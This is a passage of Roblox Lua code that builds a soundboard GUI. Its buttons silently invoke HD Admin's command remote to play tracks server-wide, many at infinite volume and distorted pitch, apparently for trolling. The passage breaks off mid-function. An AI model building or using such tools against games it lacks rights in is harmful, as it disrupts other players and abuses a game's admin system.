TextButton42.Name = "TextButton"
TextButton42.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton42.Text = "dubstep"
TextButton42.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton42.TextSize = 20
TextButton42.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TextButton42.TextWrapped = true
TextButton42.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton42.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton42.BorderSizePixel = 2
TextButton42.Position = UDim2.new(0.650877178, 0, 0.537224412, 0)
TextButton42.Size = UDim2.new(0, 113, 0, 53)
TextButton42.ZIndex = 2
TextButton42.Parent = ScrollingFrame

local LocalScript43 = Instance.new("Folder")
LocalScript43.Name = "LocalScript"
LocalScript43.Parent = TextButton42
__S[#__S + 1] = function(...)
local script = LocalScript43
script.Parent.MouseButton1Click:Connect(function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
RequestCommand:InvokeServer(";music 129604729168079 ;volume 69 ;pitch 0.125")
end)
end

local TextButton43 = Instance.new("TextButton")
TextButton43.Name = "TextButton"
TextButton43.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton43.Text = "miner"
TextButton43.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton43.TextSize = 20
TextButton43.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TextButton43.TextWrapped = true
TextButton43.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton43.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton43.BorderSizePixel = 2
TextButton43.Position = UDim2.new(0.0122807017, 0, 0.629124701, 0)
TextButton43.Size = UDim2.new(0, 113, 0, 53)
TextButton43.ZIndex = 2
TextButton43.Parent = ScrollingFrame

local LocalScript44 = Instance.new("Folder")
LocalScript44.Name = "LocalScript"
LocalScript44.Parent = TextButton43
__S[#__S + 1] = function(...)
local script = LocalScript44
script.Parent.MouseButton1Click:Connect(function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
RequestCommand:InvokeServer(";music 87086618880307 ;volume 69 ;pitch 0.058")
end)
end

local TextButton44 = Instance.new("TextButton")
TextButton44.Name = "TextButton"
TextButton44.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton44.Text = "clown music v1"
TextButton44.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton44.TextSize = 20
TextButton44.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TextButton44.TextWrapped = true
TextButton44.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton44.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton44.BorderSizePixel = 2
TextButton44.Position = UDim2.new(0.22280702, 0, 0.629124701, 0)
TextButton44.Size = UDim2.new(0, 113, 0, 53)
TextButton44.ZIndex = 2
TextButton44.Parent = ScrollingFrame

local LocalScript45 = Instance.new("Folder")
LocalScript45.Name = "LocalScript"
LocalScript45.Parent = TextButton44
__S[#__S + 1] = function(...)
local script = LocalScript45
script.Parent.MouseButton1Click:Connect(function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
RequestCommand:InvokeServer(";music 1840443935 ;volume 1.5 ;pitch 1.05")
end)
end

local TextButton45 = Instance.new("TextButton")
TextButton45.Name = "TextButton"
TextButton45.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton45.Text = "clown music v2"
TextButton45.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton45.TextSize = 20
TextButton45.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TextButton45.TextWrapped = true
TextButton45.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton45.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton45.BorderSizePixel = 2
TextButton45.Position = UDim2.new(0.44035089, 0, 0.629124701, 0)
TextButton45.Size = UDim2.new(0, 113, 0, 53)
TextButton45.ZIndex = 2
TextButton45.Parent = ScrollingFrame

local LocalScript46 = Instance.new("Folder")
LocalScript46.Name = "LocalScript"
LocalScript46.Parent = TextButton45
__S[#__S + 1] = function(...)
local script = LocalScript46
script.Parent.MouseButton1Click:Connect(function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
RequestCommand:InvokeServer(";music 1846469019 ;volume 1.5 ;pitch 1.15")
end)
end

local TextButton46 = Instance.new("TextButton")
TextButton46.Name = "TextButton"
TextButton46.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton46.Text = "infinity"
TextButton46.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton46.TextSize = 20
TextButton46.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TextButton46.TextWrapped = true
TextButton46.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton46.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton46.BorderSizePixel = 2
TextButton46.Position = UDim2.new(0.650877178, 0, 0.629124701, 0)
TextButton46.Size = UDim2.new(0, 113, 0, 53)
TextButton46.ZIndex = 2
TextButton46.Parent = ScrollingFrame

local LocalScript47 = Instance.new("Folder")
LocalScript47.Name = "LocalScript"
LocalScript47.Parent = TextButton46
__S[#__S + 1] = function(...)
local script = LocalScript47
script.Parent.MouseButton1Click:Connect(function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
RequestCommand:InvokeServer(";music 103425412151437 ;volume 2 ;pitch 0.74")
end)
end

local TextButton47 = Instance.new("TextButton")
TextButton47.Name = "TextButton"
TextButton47.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton47.Text = "jumpstyle"
TextButton47.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton47.TextSize = 20
TextButton47.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TextButton47.TextWrapped = true
TextButton47.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton47.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton47.BorderSizePixel = 2
TextButton47.Position = UDim2.new(0.0122807017, 0, 0.725697935, 0)
TextButton47.Size = UDim2.new(0, 113, 0, 53)
TextButton47.ZIndex = 2
TextButton47.Parent = ScrollingFrame

local LocalScript48 = Instance.new("Folder")
LocalScript48.Name = "LocalScript"
LocalScript48.Parent = TextButton47
__S[#__S + 1] = function(...)
local script = LocalScript48
script.Parent.MouseButton1Click:Connect(function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
RequestCommand:InvokeServer(";music 1839246711 ;volume 2 ;pitch 0.74")
end)
end

local TextButton48 = Instance.new("TextButton")
TextButton48.Name = "TextButton"
TextButton48.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton48.Text = "i love u so jumpstyle"
TextButton48.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton48.TextSize = 20
TextButton48.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TextButton48.TextWrapped = true
TextButton48.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton48.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton48.BorderSizePixel = 2
TextButton48.Position = UDim2.new(0.22280702, 0, 0.725697935, 0)
TextButton48.Size = UDim2.new(0, 113, 0, 53)
TextButton48.ZIndex = 2
TextButton48.Parent = ScrollingFrame

local LocalScript49 = Instance.new("Folder")
LocalScript49.Name = "LocalScript"
LocalScript49.Parent = TextButton48
__S[#__S + 1] = function(...)
local script = LocalScript49
script.Parent.MouseButton1Click:Connect(function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
RequestCommand:InvokeServer(";music 93544020945469 ;volume 2 ;pitch 0.55")
end)
end

local TextButton49 = Instance.new("TextButton")
TextButton49.Name = "TextButton"
TextButton49.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton49.Text = "body rolls"
TextButton49.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton49.TextSize = 20
TextButton49.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TextButton49.TextWrapped = true
TextButton49.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton49.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton49.BorderSizePixel = 2
TextButton49.Position = UDim2.new(0.44035089, 0, 0.725697935, 0)
TextButton49.Size = UDim2.new(0, 113, 0, 53)
TextButton49.ZIndex = 2
TextButton49.Parent = ScrollingFrame

local LocalScript50 = Instance.new("Folder")
LocalScript50.Name = "LocalScript"
LocalScript50.Parent = TextButton49
__S[#__S + 1] = function(...)
local script = LocalScript50
script.Parent.MouseButton1Click:Connect(function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
RequestCommand:InvokeServer(";music 96866684967655 ;volume inf ;pitch 0.046")
end)
end

local TextButton50 = Instance.new("TextButton")
TextButton50.Name = "TextButton"
TextButton50.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton50.Text = "one day i went to lidl"
TextButton50.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton50.TextSize = 17
TextButton50.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TextButton50.TextWrapped = true
TextButton50.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton50.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton50.BorderSizePixel = 2
TextButton50.Position = UDim2.new(0.650877178, 0, 0.725697935, 0)
TextButton50.Size = UDim2.new(0, 113, 0, 53)
TextButton50.ZIndex = 2
TextButton50.Parent = ScrollingFrame

local LocalScript51 = Instance.new("Folder")
LocalScript51.Name = "LocalScript"
LocalScript51.Parent = TextButton50
__S[#__S + 1] = function(...)
local script = LocalScript51
script.Parent.MouseButton1Click:Connect(function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
RequestCommand:InvokeServer(";music 138689425480022 ;volume inf ;pitch 0.053")
end)
end

local TextButton51 = Instance.new("TextButton")
TextButton51.Name = "TextButton"
TextButton51.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton51.Text = "g00byd0lan theme"
TextButton51.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton51.TextSize = 17
TextButton51.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TextButton51.TextWrapped = true
TextButton51.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton51.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton51.BorderSizePixel = 2
TextButton51.Position = UDim2.new(0.0122807017, 0, 0.825386405, 0)
TextButton51.Size = UDim2.new(0, 113, 0, 53)
TextButton51.ZIndex = 2
TextButton51.Parent = ScrollingFrame

local LocalScript52 = Instance.new("Folder")
LocalScript52.Name = "LocalScript"
LocalScript52.Parent = TextButton51
__S[#__S + 1] = function(...)
local script = LocalScript52
script.Parent.MouseButton1Click:Connect(function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
RequestCommand:InvokeServer(";music 73534555267518 ;volume inf ;pitch 0.043")
end)
end

local TextButton52 = Instance.new("TextButton")
TextButton52.Name = "TextButton"
TextButton52.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton52.Text = "you get nothing! remix"
TextButton52.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton52.TextSize = 17
TextButton52.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TextButton52.TextWrapped = true
TextButton52.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton52.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton52.BorderSizePixel = 2
TextButton52.Position = UDim2.new(0.22280702, 0, 0.825386405, 0)
TextButton52.Size = UDim2.new(0, 113, 0, 53)
TextButton52.ZIndex = 2
TextButton52.Parent = ScrollingFrame

local LocalScript53 = Instance.new("Folder")
LocalScript53.Name = "LocalScript"
LocalScript53.Parent = TextButton52
__S[#__S + 1] = function(...)
local script = LocalScript53
script.Parent.MouseButton1Click:Connect(function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
RequestCommand:InvokeServer(";music 70638443756725 ;volume inf ;pitch 0.063")
end)
end

local TextButton53 = Instance.new("TextButton")
TextButton53.Name = "TextButton"
TextButton53.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton53.Text = "real slim shady"
TextButton53.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton53.TextSize = 16
TextButton53.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TextButton53.TextWrapped = true
TextButton53.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton53.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton53.BorderSizePixel = 2
TextButton53.Position = UDim2.new(0.44035089, 0, 0.825386405, 0)
TextButton53.Size = UDim2.new(0, 113, 0, 53)
TextButton53.ZIndex = 2
TextButton53.Parent = ScrollingFrame

local LocalScript54 = Instance.new("Folder")
LocalScript54.Name = "LocalScript"
LocalScript54.Parent = TextButton53
__S[#__S + 1] = function(...)
local script = LocalScript54
script.Parent.MouseButton1Click:Connect(function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
RequestCommand:InvokeServer(";music 84500083199778 ;volume inf ;pitch 0.04")
end)
end

local TextButton54 = Instance.new("TextButton")
TextButton54.Name = "TextButton"
TextButton54.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton54.Text = "jumping is not a crime"
TextButton54.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton54.TextSize = 17
TextButton54.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TextButton54.TextWrapped = true
TextButton54.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton54.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton54.BorderSizePixel = 2
TextButton54.Position = UDim2.new(0.649042368, 0, 0.825386405, 0)
TextButton54.Size = UDim2.new(0, 113, 0, 53)
TextButton54.ZIndex = 2
TextButton54.Parent = ScrollingFrame

local LocalScript55 = Instance.new("Folder")
LocalScript55.Name = "LocalScript"
LocalScript55.Parent = TextButton54
__S[#__S + 1] = function(...)
local script = LocalScript55
script.Parent.MouseButton1Click:Connect(function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
RequestCommand:InvokeServer(";music 97467148498867 ;volume inf ;pitch 0.078")
end)
end

local UIGridLayout = Instance.new("UIGridLayout")
UIGridLayout.Name = "UIGridLayout"
UIGridLayout.CellSize = UDim2.new(0, 100, 0, 55)
UIGridLayout.SortOrder = Enum.SortOrder.LayoutOrder
UIGridLayout.Parent = ScrollingFrame

local TextButton55 = Instance.new("TextButton")
TextButton55.Name = "TextButton"
TextButton55.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton55.Text = "team fat music"
TextButton55.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton55.TextSize = 17
TextButton55.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TextButton55.TextWrapped = true
TextButton55.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton55.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton55.BorderSizePixel = 2
TextButton55.Position = UDim2.new(0.649042368, 0, 0.825386405, 0)
TextButton55.Size = UDim2.new(0, 113, 0, 53)
TextButton55.ZIndex = 2
TextButton55.Parent = ScrollingFrame

local LocalScript56 = Instance.new("Folder")
LocalScript56.Name = "LocalScript"
LocalScript56.Parent = TextButton55
__S[#__S + 1] = function(...)
local script = LocalScript56
script.Parent.MouseButton1Click:Connect(function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
RequestCommand:InvokeServer(";music 81949622378732 ;volume inf ;pitch 0.047")
end)
end

local TextButton56 = Instance.new("TextButton")
TextButton56.Name = "TextButton"
TextButton56.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton56.Text = "old jumpstyle used by exploiters"
TextButton56.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton56.TextSize = 17
TextButton56.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TextButton56.TextWrapped = true
TextButton56.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton56.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton56.BorderSizePixel = 2
TextButton56.Position = UDim2.new(0.649042368, 0, 0.825386405, 0)
TextButton56.Size = UDim2.new(0, 113, 0, 53)
TextButton56.ZIndex = 2
TextButton56.Parent = ScrollingFrame

local LocalScript57 = Instance.new("Folder")
LocalScript57.Name = "LocalScript"
LocalScript57.Parent = TextButton56
__S[#__S + 1] = function(...)
local script = LocalScript57
script.Parent.MouseButton1Click:Connect(function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
RequestCommand:InvokeServer(";music 74562925317874 ;volume inf ;pitch 0.048")
end)
end

local TextButton57 = Instance.new("TextButton")
TextButton57.Name = "TextButton"
TextButton57.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton57.Text = "mario exe"
TextButton57.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton57.TextSize = 17
TextButton57.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TextButton57.TextWrapped = true
TextButton57.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton57.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton57.BorderSizePixel = 2
TextButton57.Position = UDim2.new(0.649042368, 0, 0.825386405, 0)
TextButton57.Size = UDim2.new(0, 113, 0, 53)
TextButton57.ZIndex = 2
TextButton57.Parent = ScrollingFrame

local LocalScript58 = Instance.new("Folder")
LocalScript58.Name = "LocalScript"
LocalScript58.Parent = TextButton57
__S[#__S + 1] = function(...)
local script = LocalScript58
script.Parent.MouseButton1Click:Connect(function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
RequestCommand:InvokeServer(";music 96415207507119 ;volume inf ;pitch 0.04")
end)
end

local TextButton58 = Instance.new("TextButton")
TextButton58.Name = "TextButton"
TextButton58.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton58.Text = "darude airhorn"
TextButton58.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton58.TextSize = 17
TextButton58.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TextButton58.TextWrapped = true
TextButton58.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton58.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton58.BorderSizePixel = 2
TextButton58.Position = UDim2.new(0.649042368, 0, 0.825386405, 0)
TextButton58.Size = UDim2.new(0, 113, 0, 53)
TextButton58.ZIndex = 2
TextButton58.Parent = ScrollingFrame

local LocalScript59 = Instance.new("Folder")
LocalScript59.Name = "LocalScript"
LocalScript59.Parent = TextButton58
__S[#__S + 1] = function(...)
local script = LocalScript59
script.Parent.MouseButton1Click:Connect(function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
RequestCommand:InvokeServer(";music 123684621812387 ;volume inf ;pitch 0.085")
end)
end

local TextButton59 = Instance.new("TextButton")
TextButton59.Name = "TextButton"
TextButton59.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton59.Text = "hostage"
TextButton59.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton59.TextSize = 17
TextButton59.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TextButton59.TextWrapped = true
TextButton59.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton59.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton59.BorderSizePixel = 2
TextButton59.Position = UDim2.new(0.649042368, 0, 0.825386405, 0)
TextButton59.Size = UDim2.new(0, 113, 0, 53)
TextButton59.ZIndex = 2
TextButton59.Parent = ScrollingFrame

local LocalScript60 = Instance.new("Folder")
LocalScript60.Name = "LocalScript"
LocalScript60.Parent = TextButton59
__S[#__S + 1] = function(...)
local script = LocalScript60
script.Parent.MouseButton1Click:Connect(function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
RequestCommand:InvokeServer(";music 85934751094002 ;volume inf ;pitch 0.045")
end)
end

local TextButton60 = Instance.new("TextButton")
TextButton60.Name = "TextButton"
TextButton60.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton60.Text = "pinned pastes"
TextButton60.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton60.TextSize = 17
TextButton60.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TextButton60.TextWrapped = true
TextButton60.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton60.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton60.BorderSizePixel = 2
TextButton60.Position = UDim2.new(0.649042368, 0, 0.825386405, 0)
TextButton60.Size = UDim2.new(0, 113, 0, 53)
TextButton60.ZIndex = 2
TextButton60.Parent = ScrollingFrame

local LocalScript61 = Instance.new("Folder")
LocalScript61.Name = "LocalScript"
LocalScript61.Parent = TextButton60
__S[#__S + 1] = function(...)
local script = LocalScript61
script.Parent.MouseButton1Click:Connect(function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
RequestCommand:InvokeServer(";music 101218173912777 ;volume inf ;pitch 0.047")
end)
end

local TextButton61 = Instance.new("TextButton")
TextButton61.Name = "TextButton"
TextButton61.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton61.Text = "wush_v2"
TextButton61.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton61.TextSize = 17
TextButton61.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TextButton61.TextWrapped = true
TextButton61.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton61.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton61.BorderSizePixel = 2
TextButton61.Position = UDim2.new(0.649042368, 0, 0.825386405, 0)
TextButton61.Size = UDim2.new(0, 113, 0, 53)
TextButton61.ZIndex = 2
TextButton61.Parent = ScrollingFrame

local LocalScript62 = Instance.new("Folder")
LocalScript62.Name = "LocalScript"
LocalScript62.Parent = TextButton61
__S[#__S + 1] = function(...)
local script = LocalScript62
script.Parent.MouseButton1Click:Connect(function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
RequestCommand:InvokeServer(";music 100169103315977 ;volume inf ;pitch 0.057")
end)
end

local TextButton62 = Instance.new("TextButton")
TextButton62.Name = "TextButton"
TextButton62.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton62.Text = "zelda theme jumpstyle"
TextButton62.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton62.TextSize = 17
TextButton62.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TextButton62.TextWrapped = true
TextButton62.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton62.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton62.BorderSizePixel = 2
TextButton62.Position = UDim2.new(0.649042368, 0, 0.825386405, 0)
TextButton62.Size = UDim2.new(0, 113, 0, 53)
TextButton62.ZIndex = 2
TextButton62.Parent = ScrollingFrame

local LocalScript63 = Instance.new("Folder")
LocalScript63.Name = "LocalScript"
LocalScript63.Parent = TextButton62
__S[#__S + 1] = function(...)
local script = LocalScript63
script.Parent.MouseButton1Click:Connect(function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
RequestCommand:InvokeServer(";music 108471543072508 ;volume inf ;pitch 0.11")
end)
end

local TextButton63 = Instance.new("TextButton")
TextButton63.Name = "TextButton"
TextButton63.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton63.Text = "hotel room"
TextButton63.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton63.TextSize = 17
TextButton63.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TextButton63.TextWrapped = true
TextButton63.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton63.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton63.BorderSizePixel = 2
TextButton63.Position = UDim2.new(0.649042368, 0, 0.825386405, 0)
TextButton63.Size = UDim2.new(0, 113, 0, 53)
TextButton63.ZIndex = 2
TextButton63.Parent = ScrollingFrame

local LocalScript64 = Instance.new("Folder")
LocalScript64.Name = "LocalScript"
LocalScript64.Parent = TextButton63
__S[#__S + 1] = function(...)
local script = LocalScript64
script.Parent.MouseButton1Click:Connect(function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
RequestCommand:InvokeServer(";music 126572474447147 ;volume inf ;pitch 0.065")
end)
end

local TextButton64 = Instance.new("TextButton")
TextButton64.Name = "TextButton"
TextButton64.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton64.Text = "pastime panic 8bit"
TextButton64.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton64.TextSize = 17
TextButton64.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TextButton64.TextWrapped = true
TextButton64.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton64.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton64.BorderSizePixel = 2
TextButton64.Position = UDim2.new(0.649042368, 0, 0.825386405, 0)
TextButton64.Size = UDim2.new(0, 113, 0, 53)
TextButton64.ZIndex = 2
TextButton64.Parent = ScrollingFrame

local LocalScript65 = Instance.new("Folder")
LocalScript65.Name = "LocalScript"
LocalScript65.Parent = TextButton64
__S[#__S + 1] = function(...)
local script = LocalScript65
script.Parent.MouseButton1Click:Connect(function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
RequestCommand:InvokeServer(";music 139813235300345 ;volume inf ;pitch 0.12")
end)
end

local TextButton65 = Instance.new("TextButton")
TextButton65.Name = "TextButton"
TextButton65.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton65.Text = "attached!"
TextButton65.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton65.TextSize = 17
TextButton65.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TextButton65.TextWrapped = true
TextButton65.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton65.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton65.BorderSizePixel = 2
TextButton65.Position = UDim2.new(0.649042368, 0, 0.825386405, 0)
TextButton65.Size = UDim2.new(0, 113, 0, 53)
TextButton65.ZIndex = 2
TextButton65.Parent = ScrollingFrame

local LocalScript66 = Instance.new("Folder")
LocalScript66.Name = "LocalScript"
LocalScript66.Parent = TextButton65
__S[#__S + 1] = function(...)
